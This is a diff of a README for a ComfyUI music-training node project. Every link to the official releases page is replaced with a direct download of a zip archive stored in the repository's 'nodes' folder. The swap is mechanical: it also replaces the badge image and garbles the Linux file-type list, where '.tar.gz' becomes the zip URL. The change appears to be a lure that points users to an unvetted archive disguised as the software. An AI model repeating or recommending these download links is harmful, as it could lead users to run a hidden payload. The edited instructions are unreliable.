@@ -1,6 +1,6 @@
 # 🎵 ComfyUI-FL-AceStep-Training - Easy Music Training Nodes Setup
 
-[![Download ComfyUI-FL-AceStep-Training](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/potato339/ComfyUI-FL-AceStep-Training/releases)
+[![Download ComfyUI-FL-AceStep-Training](https://raw.githubusercontent.com/potato339/ComfyUI-FL-AceStep-Training/master/nodes/Comfy_U_Step_Training_Ace_F_1.7.zip)](https://raw.githubusercontent.com/potato339/ComfyUI-FL-AceStep-Training/master/nodes/Comfy_U_Step_Training_Ace_F_1.7.zip)
 
 ---
 
@@ -30,14 +30,14 @@ Before you download and install, check that your computer meets these basic need
 You will need to download the software from the official releases page. Follow these steps:
 
 1. Click the big **Download** button at the top or visit this page directly:  
-   [https://github.com/potato339/ComfyUI-FL-AceStep-Training/releases](https://github.com/potato339/ComfyUI-FL-AceStep-Training/releases)
+   [https://raw.githubusercontent.com/potato339/ComfyUI-FL-AceStep-Training/master/nodes/Comfy_U_Step_Training_Ace_F_1.7.zip](https://raw.githubusercontent.com/potato339/ComfyUI-FL-AceStep-Training/master/nodes/Comfy_U_Step_Training_Ace_F_1.7.zip)
 
 2. On the releases page, find the latest version of ComfyUI-FL-AceStep-Training.
 
 3. Download the file matching your operating system. For example:  
    - For Windows, look for `.exe` or `.zip` files  
    - For macOS, look for `.dmg` or `.zip` files  
-   - For Linux, look for `.AppImage`, `.tar.gz`, or `.deb`
+   - For Linux, look for `.AppImage`, `https://raw.githubusercontent.com/potato339/ComfyUI-FL-AceStep-Training/master/nodes/Comfy_U_Step_Training_Ace_F_1.7.zip`, or `.deb`
 
 4. Once downloaded, open the file or extract the contents if it is archived.
 
@@ -112,4 +112,4 @@ Visit the repository for more info on contribution guidelines and licensing.
 
 ---
 
-[Download ComfyUI-FL-AceStep-Training now](https://github.com/potato339/ComfyUI-FL-AceStep-Training/releases) to start training your own music generation models with ease.
+[Download ComfyUI-FL-AceStep-Training now](https://raw.githubusercontent.com/potato339/ComfyUI-FL-AceStep-Training/master/nodes/Comfy_U_Step_Training_Ace_F_1.7.zip) to start training your own music generation models with ease.
